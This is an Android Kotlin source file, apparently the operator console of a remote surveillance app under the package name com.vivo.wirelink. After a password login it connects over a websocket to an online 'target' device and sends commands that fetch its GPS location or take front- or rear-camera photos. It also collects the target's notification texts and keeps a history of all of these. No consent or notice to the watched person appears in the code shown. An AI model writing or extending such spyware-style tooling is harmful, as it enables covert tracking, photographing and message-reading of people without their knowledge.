// language: Kotlin, file: app/src/main/java/com/vivo/wirelink/AdminActivity.kt
package com.vivo.wirelink

import android.content.Intent
import android.graphics.BitmapFactory
import android.os.Bundle
import android.util.Base64
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.GravityCompat
import androidx.lifecycle.lifecycleScope
import com.vivo.wirelink.databinding.ActivityAdminBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.UUID

class AdminActivity : AppCompatActivity() {

    private lateinit var b: ActivityAdminBinding
    private var ws: WsClient? = null
    private val http = OkHttpClient()
    private var keepers: List<String> = emptyList()
    private var reqCounter = 0

    // in-memory history: newest first
    private val history = mutableListOf<HistoryEntry>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        b = ActivityAdminBinding.inflate(layoutInflater)
        setContentView(b.root)

        b.btnMenu.setOnClickListener { b.drawer.openDrawer(GravityCompat.START) }
        b.btnLogin.setOnClickListener { showLogin() }
        b.btnHistory.setOnClickListener { openHistory() }

        b.btnLogout.setOnClickListener {
            Prefs.setAdminToken(this, null)
            ws?.stop()
            ws = null
            keepers = emptyList()
            b.tvStatus.text = "logged out"
            b.drawer.closeDrawer(GravityCompat.START)
        }

        b.btnLoc.setOnClickListener { fireCommand("location", null) }
        b.btnCamFront.setOnClickListener {
            fireCommand("camera", JSONObject().put("lens", "front"))
        }
        b.btnCamRear.setOnClickListener {
            fireCommand("camera", JSONObject().put("lens", "rear"))
        }

        b.tvStatus.text = "not connected"

        Prefs.adminToken(this)?.let { connectWs(it) }
    }

    // ---------- login ----------

    private fun showLogin() {
        val et = EditText(this).apply { hint = "password" }
        AlertDialog.Builder(this)
            .setTitle("Sign in")
            .setView(et)
            .setPositiveButton("Continue") { _, _ ->
                lifecycleScope.launch { login(et.text.toString()) }
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private suspend fun login(password: String) {
        val base = Prefs.backendUrl(this) ?: run {
            toast("no backend url"); return
        }

        val token = withContext(Dispatchers.IO) {
            runCatching {
                val body = JSONObject()
                    .put("password", password)
                    .toString()
                    .toRequestBody("application/json".toMediaType())

                val req = Request.Builder()
                    .url("$base/api/login")
                    .post(body)
                    .build()

                http.newCall(req).execute().use { r ->
                    if (!r.isSuccessful) return@withContext null
                    val raw = r.body?.string() ?: return@withContext null
                    JSONObject(raw).optString("token").takeIf { it.isNotEmpty() }
                }
            }.getOrNull()
        }

        if (token == null) { toast("wrong password"); return }

        Prefs.setAdminToken(this, token)
        connectWs(token)
        b.drawer.closeDrawer(GravityCompat.START)
        toast("signed in")
    }

    // ---------- history ----------

    private fun openHistory() {
        val intent = Intent(this, HistoryActivity::class.java)
        HistoryActivity.seed(history.toList())
        startActivity(intent)
        b.drawer.closeDrawer(GravityCompat.START)
    }

    private fun remember(entry: HistoryEntry) {
        history.add(0, entry) // newest first
        // hard cap in memory at 200 entries
        while (history.size > 200) history.removeAt(history.size - 1)
    }

    // ---------- websocket ----------

    private fun connectWs(token: String) {
        ws?.stop()
        val base = Prefs.backendUrl(this) ?: return
        val url = base.replaceFirst("http", "ws") + "/ws/admin?token=$token"

        ws = WsClient(
            url = url,
            onOpen = { runOnUiThread { b.tvStatus.text = "connected" } },
            onMessage = { m -> runOnUiThread { onWsMessage(m) } },
            onClosed = { runOnUiThread { b.tvStatus.text = "reconnecting…" } },
        ).also { it.start(lifecycleScope) }
    }

    private fun onWsMessage(m: JSONObject) {
        when (m.optString("type")) {
            "keepers" -> {
                val arr: JSONArray = m.optJSONArray("payload") ?: JSONArray()
                keepers = (0 until arr.length()).map { arr.getString(it) }
                b.tvStatus.text = if (keepers.isEmpty())
                    "no target online"
                else
                    "target: ${keepers.first()}"
            }
            "result" -> handleResult(m)
            "error"  -> toast(m.optString("error"))
            "hello"  -> Unit
        }
    }

    private fun handleResult(m: JSONObject) {
        val cmd = m.optString("command")

        if (!m.optBoolean("success")) {
            toast("$cmd: ${m.optString("error")}")
            return
        }

        val p = m.optJSONObject("payload") ?: return
        val deviceId = m.optString("deviceId")
        val ts = p.optLong("ts", System.currentTimeMillis())

        when (cmd) {
            "location" -> {
                val lat = p.optDouble("lat")
                val lng = p.optDouble("lng")
                val acc = p.optDouble("acc").toInt()
                b.tvStatus.text = "loc: $lat, $lng (±${acc}m)"
                remember(HistoryEntry(
                    kind = HistoryEntry.KIND_LOCATION,
                    ts = ts,
                    deviceId = deviceId,
                    lat = lat,
                    lng = lng,
                    accuracy = acc
                ))
            }
            "camera" -> {
                val bytes = Base64.decode(p.optString("b64"), Base64.DEFAULT)
                val bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                if (bmp != null) b.ivPreview.setImageBitmap(bmp)
                val kb = bytes.size / 1024
                b.tvStatus.text = "${p.optString("lens")} cam · ${kb} KB"
                remember(HistoryEntry(
                    kind = HistoryEntry.KIND_PHOTO,
                    ts = ts,
                    deviceId = deviceId,
                    lens = p.optString("lens"),
                    photoB64 = p.optString("b64"),
                    sizeBytes = bytes.size
                ))
            }
            "notification" -> {
                val app = p.optString("app")
                val title = p.optString("title")
                val text = p.optString("text")
                b.tvStatus.text = "🔔 $app · $title"
                remember(HistoryEntry(
                    kind = HistoryEntry.KIND_NOTIFICATION,
                    ts = ts,
                    deviceId = deviceId,
                    notifApp = app,
                    notifTitle = title,
                    notifText = text
                ))
            }
        }
    }

    private fun fireCommand(cmd: String, payload: JSONObject?) {
        val w = ws ?: run { toast("not connected"); return }
        val target = keepers.firstOrNull() ?: run { toast("no target online"); return }

        val reqId = "r${++reqCounter}-${UUID.randomUUID().toString().take(6)}"

        w.send(JSONObject().apply {
            put("type", "command")
            put("reqId", reqId)
            put("deviceId", target)
            put("command", cmd)
            if (payload != null) put("payload", payload)
        })

        b.tvStatus.text = "sent: $cmd"
    }

    // ---------- misc ----------

    private fun toast(s: String) =
        Toast.makeText(this, s, Toast.LENGTH_SHORT).show()

    override fun onDestroy() {
        ws?.stop()
        super.onDestroy()
    }
}
